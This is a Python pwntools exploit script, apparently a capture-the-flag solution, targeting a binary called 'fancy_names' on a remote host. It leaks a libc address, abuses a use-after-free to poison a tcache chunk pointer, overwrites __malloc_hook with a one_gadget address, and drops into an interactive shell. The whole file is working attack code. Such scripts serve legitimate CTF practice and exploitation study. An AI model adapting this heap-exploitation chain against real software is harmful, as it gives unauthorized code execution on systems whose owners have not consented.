#!/usr/bin/env python3

from pwn import *

exe = ELF("fancy_names")
libc = exe.libc

context.binary = exe


def conn():
    global r

    if args.LOCAL:
        r = process([exe.path])
        if args.DDEBUG:
            gdb.attach(r)
    else:
        r = remote("94.237.50.249", 33923)

    return r


def leak_fprintf_addr() -> int:
    r.sendafter(b"> ", b"1")
    r.sendafter(b": ", b"A" * 56)
    r.recvuntil(b"A" * 56)
    address = u64(r.recv(6) + b"\x00\x00") - 148
    r.sendlineafter(b": ", b"n")
    return address


def use_after_free(data: bytes):
    r.sendlineafter(b"> ", b"2")
    r.sendlineafter(b"> ", b"1")
    r.sendlineafter(b"> ", b"1")
    r.sendafter(b": ", data)
    r.sendlineafter(b": ", b"y")


def alloc_chunk(size: int, data: bytes):
    r.sendlineafter(b"> ", b"1")
    r.sendlineafter(b": ", str(size).encode("ascii"))
    r.sendlineafter(b": ", data)


def use_shell():
    r.sendlineafter(b"> ", b"1")
    r.sendlineafter(b": ", b"pwned")
    r.clean(1)
    r.interactive("$ ")


def main():
    r = conn()

    libc.address = leak_fprintf_addr() - libc.sym.fprintf
    log.info(f"libc @ 0x{libc.address:x}")

    # Program overwrites last byte with NULL byte so we'll append a random byte
    payload = p64(libc.sym.__malloc_hook)[:-2] + b"A\x00"
    use_after_free(payload)     # Overwrite chunk's next ptr in tcachebin

    # Alloc chunks of the same size then overwrite __malloc_hook with one_gadget
    alloc_chunk(0x68, b"A" * 0x10)
    alloc_chunk(0x68, p64(libc.address + 0x4f432))

    use_shell()


if __name__ == "__main__":
    main()
